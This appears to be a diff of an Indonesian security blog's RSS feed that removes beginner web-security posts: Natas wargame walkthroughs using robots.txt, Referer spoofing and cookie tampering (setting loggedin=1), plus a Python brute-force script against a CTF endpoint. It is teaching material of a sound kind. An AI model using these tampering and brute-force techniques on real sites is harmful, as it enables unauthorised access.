-<p>Karena HTML merupakan struktur dari sebuah web, ya setidaknya perlu mengetahui bagaimana HTML bekerja. Salah satu penerapannya ialah jika kita ingin mengeksploitasi bagian client side maka kita perlu menganalisa kode HTML web tsb.</p>
-<p>Mempelajari HTML:</p>
-<p><a href="https://www.google.com/url?q=https://www.w3schools.com/Html/&amp;sa=D&amp;ust=1532108601626000">https://www.w3schools.com/Html/</a></p>
-<p><a href="https://www.google.com/url?q=https://sekolahkoding.com/kelas/belajar-html-dari-dasar&amp;sa=D&amp;ust=1532108601626000">https://sekolahkoding.com/kelas/belajar-html-dari-dasar</a></p>
-<p><strong>JavaScript</strong></p>
-<p>Sebuah bahasa scripting yang sangat luar biasa.</p>
-<p><img src="/wp-content/2018/07/image22.png" alt=""></p>
-<p>Javascript pada awalnya merupakan bahasa client side yang digunakan pada web untuk dapat menjadikan halaman web lebih interaktif, walaupun sekarang trend javascript digunakan pada backend.</p>
-<p>Ada banyak sekali saya temui website yang masih memproses data sensitif pada client side, sehingga memunculkan celah keamanan yang serius. Oleh karena itu kita perlu mempelajari JS agar dapat menganalisa source code dan mencari kelemahannya.</p>
-<p>Mempelajari JavaScript:</p>
-<p><a href="https://www.google.com/url?q=https://www.w3schools.com/js/&amp;sa=D&amp;ust=1532108601630000">https://www.w3schools.com/js/</a></p>
-<p><a href="https://www.google.com/url?q=https://sekolahkoding.com/track/menguasai-javascript&amp;sa=D&amp;ust=1532108601630000">https://sekolahkoding.com/track/menguasai-javascript</a></p>
-<p><strong>PHP (Hypertext PreProcessor)</strong></p>
-<p>Sebuah bahasa scripting yang dikususkan untuk sisi backend, salah satu bahasa favorit penulis. Walaupun sekarang performanya banyak dibilang kalah dengan pesaingnya seperti JS, Ruby, Go, dll.</p>
-<p>Tapi PHP merupakan bahasa yang secara luas masih digunakan oleh masyarakat umum (kususnya Indonesia) untuk membuat sebuah web dan api sekala kecil-menengah. Jika kita perhatikan, web hosting pun msh menggunakan Linux + Apache + MySQL + PHP sebagai stack utamanya. PHP juga memiliki dukungan komunitas yang luar biasa besar, termasuk Indonesia. Hampir semua website pun didominasi oleh PHP. Sehingga bahasa ini perlu perhatian kusus, terutama dalam ranah security, karena kadangkala terdapat banyak sekali celah pada bahasa pemrograman ini (banyak sekali deprecated function yang vuln).</p>
-<p>Mempelajari PHP:
-<a href="https://www.google.com/url?q=https://www.w3schools.com/php/&amp;sa=D&amp;ust=1532108601632000">https://www.w3schools.com/php/</a></p>
-<p><a href="https://www.google.com/url?q=https://sekolahkoding.com/track/backend-website&amp;sa=D&amp;ust=1532108601633000">https://sekolahkoding.com/track/backend-website</a></p>
-<p><strong>Python</strong></p>
-<p>Sebuah bahasa scripting yang simpel dan powerful, sangat banyak dukungan library yang dapat memudahkan pengguna. Sehingga bisa kita sebut bahwa python ini sebuah bahasa yang fokus untuk memberikan kemudahan kepada penggunanya (Bandingkan dengan compiled language seperti C++ dan Java yang sangat strict).</p>
-<p>Oleh karena itu, seringkali python digunakan dalam membuat sebuah tools eksploitasi. Penulis juga sering menggunakan python untuk membuat tools otomatisasi untuk melakukan eksploitasi.</p>
-<p>Bahasa lain selain python yang sering digunakan untuk membuat tools adalah ruby. Jika berminat mungkin pembaca bisa mempelajarinya juga.</p>
-<p>Mempelajari Python:</p>
-<p><a href="https://www.google.com/url?q=https://www.tutorialspoint.com/python/index.htm&amp;sa=D&amp;ust=1532108601634000">https://www.tutorialspoint.com/python/index.htm</a></p>
-<p>Latihan:</p>
-<p><a href="https://www.google.com/url?q=http://natas6.natas.labs.overthewire.org/&amp;sa=D&amp;ust=1532108601636000">http://natas6.natas.labs.overthewire.org/</a></p>
-<p>Mari kita buka URL diatas. Terdapat hal yang menarik, yaitu kita diberikan sebuah source code. Berikut ini adalah penggalan source code PHP:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>&lt;?
-
-include &quot;includes/secret.inc&quot;;
-
-    if(array_key_exists(&quot;submit&quot;, $_POST)) {
-
-        if($secret == $_POST['secret']) {
-
-           print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;
-
-        } else {
-
-           print &quot;Wrong secret&quot;;
-
-       }
-
-    }
-
-?&gt;
-</code></pre>
-<!-- raw HTML omitted -->
-<p>Jika kita perhatikan source code diatas, kita bisa mengetahui bahwa flag akan didapatkan apabila value/nilai dari variabel $secret itu sama dengan nilai dari variabel $_POST[‘secret’] yang kita inputkan melalui form dibawah ini</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>&lt;form method=post&gt;
-
-Input secret: &lt;input name=secret&gt;&lt;br&gt;
-
-&lt;input type=submit name=submit&gt;
-
-&lt;/form&gt;
-</code></pre>
-<!-- raw HTML omitted -->
-<p> </p>
-<p>Jika kita analisis lebih dalam kode php tsb, kita bisa menduga bahwa variabel $secret berasal dari file secret.inc yang diinclude.</p>
-<p>Oleh karena itu, mari kita cek /includes/secret.inc</p>
-<p>Setelah kita cek, ternyata kosong hehehe.</p>
-<p>Hah? Kosong?</p>
-<p>Eits . . jangan panik dulu, coba kita lihat source code nya dengan ctrl+u.</p>
-<p>Akhirnya kita menemukan nilai dari variabel $secret yay.</p>
-<p>Selanjutnya adalah kita akan menginputkan nilai dari var $secret tsb kedalam form, sehingga kita akan mendapatkan flagnya.</p>
-<p><img src="/wp-content/2018/07/image15.png" alt=""></p>
-<p>Jeng Jeng !!!</p>
-<p><img src="/wp-content/2018/07/image4.png" alt=""></p>
-<p>Selamat.</p>
-<p><strong>Membuat Script Otomatisasi Dengan Python</strong></p>
-<p>Saya asumsikan pembaca sudah memahami dasar python.</p>
-<p>Salah satu kegunaan bahasa pemrograman adalah membuat script/tools untuk otomatisasi, salah satunya adalah untuk melakukan bruteforcing.</p>
-<p>Ayo kita langsung mempraktikkannya.</p>
-<p>Pertama, siapkan python 2.7 (Karena saya biasa menggunakan versi 2.7)</p>
-<p>Lalu kita jalankan perintah berikut pada cmd/bash untuk menginstall modul requests</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>pip install requests
-
-atau
-
-sudo pip install requests
-</code></pre>
-<!-- raw HTML omitted -->
-<p>Untuk dokumentasi python requests, bisa kita lihat pada web berikut</p>
-<p><a href="https://www.google.com/url?q=http://docs.python-requests.org/en/master/&amp;sa=D&amp;ust=1532108601649000">http://docs.python-requests.org/en/master/</a></p>
-<p>Setelah selesai, mari kita buka url berikut.</p>
-<p><a href="https://www.google.com/url?q=http://ctf.asgama.tk:40001/&amp;sa=D&amp;ust=1532108601650000">http://ctf.asgama.tk:40001/</a></p>
-<p>Terdapat sebuah deskripsi</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>Selamat datang, silakan menebak angka dari 1-100 menggunakan ?guess=</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Kita diberi instruksi untuk menebak angka, dan inputan menggunakan metode get dengan parameter guess, sehingga kita perlu menambahkan ?guess=nilai pada url, contoh:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p><a href="http://ctf.asgama.tk:40001/?guess=1">http://ctf.asgama.tk:40001/?guess=1</a></p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Lalu kita mendapatkan sebuah pesan</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>Tebakan anda salah, coba lagi.</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Oke, artinya kita salah menebak angka yang artinya bukan angka 1. Sebenarnya kita bisa saja menebak secara manual dari 1-100 berhubung angkanya sedikit. Namun apabila sudah sampai ratusan bahkan ribuan, jelas akan menghabiskan waktu kita dan juga jari bakalan pegal pegal :’(</p>
-<p>Solusinya adalah kita akan membuat script otomatisasi dengan python yang akan menebak angka dari 1-100, apabila sudah ketemu hasilnya maka otomatis script akan berhenti dan memberi tahu kita outputnya :)</p>
-<p>Buatlah sebuah file dengan nama bebas dengan ekstensi .py</p>
-<p>Misal guessnum.py</p>
-<p>Lalu kita pastekan kode dibawah ini</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>import requests
-
-url = &quot;http://ctf.asgama.tk:40001/?guess=&quot;
-
-for i in range(101):
-
-   r = requests.get(url + str(i))
-
-   if &quot;salah&quot; not in r.text:
-
-       print r.text
-
-       break
-
-   else:
-
-       print &quot;Bukan &quot; + str(i)
-</code></pre>
-<!-- raw HTML omitted -->
-<p>Jadi kita akan melakukan loop for i dari 0 sampai 100 dimana nanti akan kita cek hasil/output nya, jika terdapat kata “salah” maka kita akan meneruskan iterasi. Namun apabila tidak terdapat kata salah, maka bisa kita pastikan itu adalah jawabannya lalu print outputnya dan kita hentikan iterasi.</p>
-<p>Hasil running program:</p>
-<p><img src="/wp-content/2018/07/image28.png" alt=""></p>
-<p>Selamat, kita mendapatkan flagnya.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Web Security Basic - Pengenalan Website</title>
-            <link>https://cacadosman.com/2018/07/20/web-security-basic-pengenalan-website/</link>
-            <pubDate>Fri, 20 Jul 2018 17:05:41 +0000</pubDate>
-            
-            <guid>https://cacadosman.com/2018/07/20/web-security-basic-pengenalan-website/</guid>
-            <description>Bagaimana cara kerja website?
-Simpelnya ialah melakukan request dan response. {{$.Site.BaseURL}}
-Kita analogikan client itu adalah kita, lalu kita melakukan sebuah HTTP Request ke server (Bagaikan kita meminta tolong kepada seseorang). Kemudian server memproses dan memberikan sebuah response kepada client (Bagaikan seseorang itu menerima permintaan tolong kita lalu memberikan respon untuk membantu).
-HTTP Headers
-HTTP Headers memungkinkan kita untuk memberikan informasi tambahan pada Request/Response. Intinya ialah informasi yang tersimpan pada request/response message.</description>
-            <content type="html"><![CDATA[<p>Bagaimana cara kerja website?</p>
-<p><img src="/wp-content/2018/07/image35.png" alt=""></p>
-<p>Simpelnya ialah melakukan request dan response. {{$.Site.BaseURL}}</p>
-<p>Kita analogikan client itu adalah kita, lalu kita melakukan sebuah HTTP Request ke server (Bagaikan kita meminta tolong kepada seseorang). Kemudian server memproses dan memberikan sebuah response kepada client (Bagaikan seseorang itu menerima permintaan tolong kita lalu memberikan respon untuk membantu).</p>
-<p><strong>HTTP Headers</strong></p>
-<p>HTTP Headers memungkinkan kita untuk memberikan informasi tambahan pada Request/Response. Intinya ialah informasi yang tersimpan pada request/response message.</p>
-<p>Header ini menyimpan beberapa informasi seperti cookie.</p>
-<p>Bagaimana Caranya ?</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>Menggunakan bash linux:</p>
-</blockquote>
-<blockquote>
-<p>curl -I -X HEAD <a href="https://www.google.com/">https://www.google.com/</a></p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Output:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>HTTP/1.1 200 OK</p>
-</blockquote>
-<blockquote>
-<p>Date: Sat, 23 Jun 2018 07:54:47 GMT</p>
-</blockquote>
-<blockquote>
-<p>Expires: -1</p>
-</blockquote>
-<blockquote>
-<p>Cache-Control: private, max-age=0</p>
-</blockquote>
-<blockquote>
-<p>Content-Type: text/html; charset=ISO-8859-1</p>
-</blockquote>
-<blockquote>
-<p>P3P: CP=&quot;This is not a P3P policy! See g.co/p3phelp for more info.&rdquo;</p>
-</blockquote>
-<blockquote>
-<p>Server: gws</p>
-</blockquote>
-<blockquote>
-<p>X-XSS-Protection: 1; mode=block</p>
-</blockquote>
-<blockquote>
-<p>X-Frame-Options: SAMEORIGIN</p>
-</blockquote>
-<blockquote>
-<p>Set-Cookie: 1P_JAR=2018-06-23-07; expires=Mon, 23-Jul-2018 07:54:47 GMT; path=/; domain=.google.com</p>
-</blockquote>
-<blockquote>
-<p>Set-Cookie: NID=133=dFvhPVCJTwachtJg0RGWWyBdEv-sTLJzyrRhykEfxfo9X804kHiraIm3InYXeOasJz_eWoB2opuS1mense-dWVna6TTkFWJfKc-J8tbXRzhvDVwoeddCCFRWtzWzfIJi; expires=Sun, 23-Dec-2018 07:54:47 GMT; path=/; domain=.google.com; HttpOnly</p>
-</blockquote>
-<blockquote>
-<p>Transfer-Encoding: chunked</p>
-</blockquote>
-<blockquote>
-<p>Alt-Svc: quic=&rdquo;:443&rdquo;; ma=2592000; v=&quot;43,42,41,39,35&rdquo;</p>
-</blockquote>
-<blockquote>
-<p>Accept-Ranges: none</p>
-</blockquote>
-<blockquote>
-<p>Vary: Accept-Encoding</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Kita bisa melihat banyak informasi yang terdapat pada header seperti status, cookie, domain, content-type dll.</p>
-<p><strong>Cookie &amp; Session</strong></p>
-<p>Apa itu cookie?</p>
-<p>Cookie adalah informasi dalam bentuk string yang tersimpan pada client/browser.</p>
-<p>Sering digunakan untuk menyimpan informasi preferensi website, otentikasi, server session indentification, dll.</p>
-<p>Cara mengakses cookie?</p>
-<p>Cara paling simpel ialah menggunakan extension EditThisCookie</p>
-<p><img src="/static/wp-content/2018/07/image17.png" alt=""></p>
-<p>Cara lain mengakses cookie ialah menggunakan Javascript, masukkan kode berikut ke address bar lalu tekan enter:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>javascript:document.cookie</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Maka kita dapat melihat cookie yang tersimpan.</p>
-<p>Apa itu Session?</p>
-<p>Hampir sama seperti cookie, namun bedanya session tersimpan pada server. Biasanya digunakan untuk otentikasi user.</p>
-<p>Bagaimana server mengetahui session kita?
-Dengan mengidentifikasi session id yang tersimpan pada cookie browser kita.</p>
-<p>Contoh:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>PHPSESSID=u347pnq87d249m0esu131qtm80</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Implementasinya ialah saat kita diharuskan terlebih dahulu melakukan login untuk mengakses suatu halaman pada website, dengan adanya session, kita tidak perlu lagi melakukan login berulang saat mengakses halaman tersebut sebelum kita melakukan logout.</p>
-<p><strong>Robots</strong></p>
-<p>Apa itu web robots?</p>
-<p>Web Robots atau Web Crawler adalah sebuah program yang dapat menelusuri web secara otomatis. Contohnya search engine google yang menggunakan web robots untuk melakukan indexing.</p>
-<p>Admin web dapat memberikan sebuah instruksi untuk Web Robots dengan menggunakan /robots.txt</p>
-<p>Contoh: <a href="https://www.google.com/url?q=https://example.com/robots.txt&amp;sa=D&amp;ust=1532108601604000">https://example.com/robots.txt</a></p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>User-agent: *
-Disallow: /admin</p>
-<!-- raw HTML omitted -->
-<p>User-agent: * artinya berlaku untuk semua robots</p>
-<p>Disallow: /admin artinya kita melarang robots tersebut untuk mengakses /admin yang kemungkinan terdapat informasi penting yang tidak ingin terekspos pada search engine.</p>
-<p>Latihan:</p>
-<p><a href="https://www.google.com/url?q=http://natas3.natas.labs.overthewire.org/&amp;sa=D&amp;ust=1532108601607000">http://natas3.natas.labs.overthewire.org/</a></p>
-<p>Saat kita buka url diatas, tidak ada apa-apa. Mari kita lihat source codenya :)</p>
-<p><img src="/wp-content/2018/07/image7.png" alt=""></p>
-<p>Terdapat hint:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>No more information leaks!! Not even Google will find it this time&hellip;</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Dari hint diatas kita bsa mengetahui bahwa search engine google pun tidak dapat menemukannya. Sehingga kita bisa menyimpulkan bahwa ini berkaitan dengan robots yang mencegah search engine google untuk mengakses lebih dalam.</p>
-<p>Okay, langsung saja kita akses /robots.txt</p>
-<p><img src="/wp-content/2018/07/image8.png" alt=""></p>
-<p>Terdapat sesuatu yang menarik :3</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Disallow: /s3cr3t/</p>
-<!-- raw HTML omitted -->
-<p>Artinya search engine tidak diperbolehkan mengakses /s3cr3t/</p>
-<p>Oleh karena itu ayo kita akses /s3cr3t/</p>
-<p><img src="/wp-content/2018/07/image8-1.png" alt=""></p>
-<p>Hehehe, terdapat users.txt dan mari kita buka :3</p>
-<p><img src="/wp-content/2018/07/image16.png" alt=""></p>
-<p>Yay kita mendapatkan flagnya :3</p>
-<p>Latihan:</p>
-<p><a href="https://www.google.com/url?q=http://natas4.natas.labs.overthewire.org/&amp;sa=D&amp;ust=1532108601611000">http://natas4.natas.labs.overthewire.org/</a></p>
-<p>Mari kita buka url diatas, terdapat hint yang menarik</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>Access disallowed. You are visiting from &quot;&rdquo; while authorized users should come only from &ldquo;<a href="http://natas5.natas.labs.overthewire.org/%22">http://natas5.natas.labs.overthewire.org/&quot;</a></p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Dari kalimat diatas, kita akan mendapatkan flag/authorized saat kita mengakses natas4 dari natas5, sehingga dalam kasus ini kita perlu merubah header Referer menjadi <a href="https://www.google.com/url?q=http://natas4.natas.labs.overthewire.org/&amp;sa=D&amp;ust=1532108601613000">http://natas5.natas.labs.overthewire.org/</a></p>
-<p>Ada beberapa cara, pertama inspect element, kedua menggunakan postman, ketiga menggunakan burp suite.</p>
-<p>Kita akan menggunakan cara kedua, karena simpel dan elegan. Bagi yang belum mempunyai postman, silakan install postman terlebih dahulu :3</p>
-<p><a href="https://www.google.com/url?q=https://www.getpostman.com/apps&amp;sa=D&amp;ust=1532108601614000">https://www.getpostman.com/apps</a></p>
-<p>Setelah itu mari kita buka postman</p>
-<p><img src="/wp-content/2018/07/image26.png" alt=""></p>
-<p>Kita menggunakan GET method, lalu masukkan url natas 4 ke address bar postman, setelah itu pada tab authorization pilih Type basic auth. Kemudian masukkan username natas4 dan passwordnya.</p>
-<p><img src="/wp-content/2018/07/image10.png" alt=""></p>
-<p>Setelah itu kita klik tombol Send yang berwarna biru :3</p>
-<p>Maka kita akan mendapatkan sebuah response body.</p>
-<p><img src="/wp-content/2018/07/image11.png" alt=""></p>
-<p>Lanjut kita akan memanipulasi header. Pilih tab header dan tambahkan “Referer” lalu isikan dengan url natas5</p>
-<p><img src="/wp-content/2018/07/image34.png" alt=""></p>
-<p>Setelah itu kita klik lagi tombol Send.</p>
-<p><img src="/wp-content/2018/07/image25.png" alt=""></p>
-<p>Cek response body, maka kita akan mendapatkan sebuah flag yay.</p>
-<p>Latihan:</p>
-<p><a href="https://www.google.com/url?q=http://natas5.natas.labs.overthewire.org/&amp;sa=D&amp;ust=1532108601618000">http://natas5.natas.labs.overthewire.org/</a></p>
-<p>Mari kita buka URL diatas, terdapat hint yang menarik:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>Access disallowed. You are not logged in</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Mari kita lihat source codenya</p>
-<p><img src="/wp-content/2018/07/image12.png" alt=""></p>
-<p>Tidak ada yang menarik, tapi karena dari kalimat hint tsb yang terlihat mengarah ke otentikasi (login) maka kita coba cek cookie nya.</p>
-<p>Cara cek cookie yaitu dengan mengetikkan script JS ini ke address bar:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>javascript:document.cookie</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Maka kita akan mendapatkan string yang merupakan cookie</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>__utma=176859643.990165392.1529731465.1529739031.1530110948.3; __utmz=176859643.1529731465.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=176859643; loggedin=0</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Terdapat loggedin=0</p>
-<p>Maka kita ubah saja menjadi 1 dengan merubah cookie tsb.</p>
-<p>Caranya sama seperti diatas, kita pastekan ke address bar</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>javascript:document.cookie = “loggedin=1”</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Lalu kita reload kembali url natas5, maka kita akan mendapatkan flag</p>
-<p><img src="/wp-content/2018/07/image23.png" alt=""></p>
-<p>Yay selamat.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Web Security Basic - Source Code</title>
-            <link>https://cacadosman.com/2018/07/20/web-security-basic-source-code/</link>
-            <pubDate>Fri, 20 Jul 2018 16:49:48 +0000</pubDate>
-            
-            <guid>https://cacadosman.com/2018/07/20/web-security-basic-source-code/</guid>
-            <description>Pertama yang harus kita lakukan adalah menganalisa atau mencari informasi.
-Salah satu yang paling mudah ialah melihat source code dari halaman web.
-Pada browser (Chrome/Firefox) kita hanya perlu menekan kombinasi tombol
-ctrl + U Pada Keyboard untuk menampilkan source code.
-Kadangkala sebuah halaman web tidak mengizinkan kita untuk melihat source code, solusi alternatifnya adalah membuka url tersebut di tab baru dgn tambahan prefix view-source: diawal url
-Contoh:
- view-source:https://google.com/
- Latihan:</description>
-            <content type="html"><![CDATA[<p>Pertama yang harus kita lakukan adalah menganalisa atau mencari informasi.</p>
-<p>Salah satu yang paling mudah ialah melihat source code dari halaman web.</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Pada browser (Chrome/Firefox) kita hanya perlu menekan kombinasi tombol</p>
-<p>ctrl  + U Pada Keyboard untuk menampilkan source code.</p>
-<p>Kadangkala sebuah halaman web tidak mengizinkan kita untuk melihat source code, solusi alternatifnya adalah membuka url tersebut di tab baru dgn tambahan prefix view-source: diawal url</p>
-<p>Contoh:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p>view-source:https://google.com/</p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Latihan:</p>
-<p><a href="https://www.google.com/url?q=http://overthewire.org/wargames/natas/natas0.html&amp;sa=D&amp;ust=1532108601588000">http://overthewire.org/wargames/natas/natas0.html</a></p>
-<p>Coba kita buka url diatas, lalu terdapat Wargames Natas level 0. Mari kita buka url tersebut kemudian memasukkan username dan password yang sudah diberikan.</p>
-<p>Setelah itu kita coba untuk melihat source code dengan cara diatas. Maka kita akan melihat halaman yang berisikan source codenya.</p>
-<p><img src="/wp-content/2018/07/image14.png" alt=""></p>
-<p>Maka kita bisa menemukan password untuk natas1 atau level selanjutnya, selamat.</p>
-<p>Latihan 2:</p>
-<p><a href="https://www.google.com/url?q=http://natas2.natas.labs.overthewire.org&amp;sa=D&amp;ust=1532108601590000">http://natas2.natas.labs.overthewire.org</a></p>
-<p>Mari kita buka url diatas dan masukkan password yang didapat dari natas1. Jangan lupa buka source code, jika kita perhatikan maka tidak lagi terdapat password. Akan tetapi terdapat hal yang mencurigakan, yaitu terdapat sebuah path /files/pixel.png pada atribut src didalam tag img.</p>
-<p><img src="/wp-content/2018/07/image31.png" alt=""></p>
-<p>Mari kita akses <a href="https://www.google.com/url?q=http://natas2.natas.labs.overthewire.org/files&amp;sa=D&amp;ust=1532108601591000">http://natas2.natas.labs.overthewire.org/files</a>/</p>
-<p>Maka kita akan menemukan users.txt. Kemudian saat kita buka, kita akan mendapatkan sebuah flag. Selamat.</p>
-]]></content>
         </item>
         
         <item>
@@ -1670,7 +1118,7 @@ while c &lt; 10:
 <p>Encoding = Plaintext &lt; &mdash;&gt; Algoritma &lt; &mdash;&gt; Ciphertext</p>
 <p>Hash = Plaintext &mdash;&gt; Algoritma &mdash;&gt; Ciphertext (irreversible)</p>
 <p><strong>Caesar Cipher (Geser)</strong></p>
-<p>Misal kita mempunyai plaintext m = &ldquo;halo&rdquo; dan memiliki key k = 2, maka cipher textnya c kita geser/tambahkan digit karakter sebesar key k pada plaintext dari m[i=1] sampai m[L] dimana L adalah jumlah karakter pada plaintext m dan n adalah jumlah/total alphabet dari index &ldquo;a&quot;=0 sampai index &ldquo;z&quot;=25 (n = 26).</p>
+<p>Misal kita mempunyai plaintext m = &ldquo;halo&rdquo; dan memiliki key k = 2, maka cipher textnya c kita geser/tambahkan digit karakter sebesar key k pada plaintext dari m[i=1] sampai m[L] dimana L adalah jumlah karakter pada plaintext m dan n adalah jumlah/total alphabet dari index &ldquo;a&rdquo;=0 sampai index &ldquo;z&rdquo;=25 (n = 26).</p>
 <p><em>Formula/Rumus:</em></p>
 <!-- raw HTML omitted -->
 <blockquote>
@@ -1740,11 +1188,11 @@ print c
             
             <guid>https://cacadosman.com/olc-cyber-security-1-dasar-python-dan-kripto/</guid>
             <description>Hi readers, i want to share some tutorials how to create a blog without spending any money :D
-I know we don&#39;t like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn&#39;t mean easy to do :)
-You need to have some coding skills to create something like this. But don&#39;t worry, i&#39;ll teach you how to do.</description>
+I know we don&amp;rsquo;t like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn&amp;rsquo;t mean easy to do :)
+You need to have some coding skills to create something like this. But don&amp;rsquo;t worry, i&amp;rsquo;ll teach you how to do.</description>
             <content type="html"><![CDATA[<p>Hi readers, i want to share some tutorials how to create a blog without spending any money :D</p>
-<p>I know we don't like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn't mean easy to do :)</p>
-<p>You need to have some coding skills to create something like this. But don't worry, i'll teach you how to do.</p>
+<p>I know we don&rsquo;t like to spending our money to buy some shit like this hahaha, so this is the best solution for you that want to have a free blog. However, free doesn&rsquo;t mean easy to do :)</p>
+<p>You need to have some coding skills to create something like this. But don&rsquo;t worry, i&rsquo;ll teach you how to do.</p>
 <p><strong>Requirements</strong></p>
 <ul>
 <li>Ruby Gems</li>
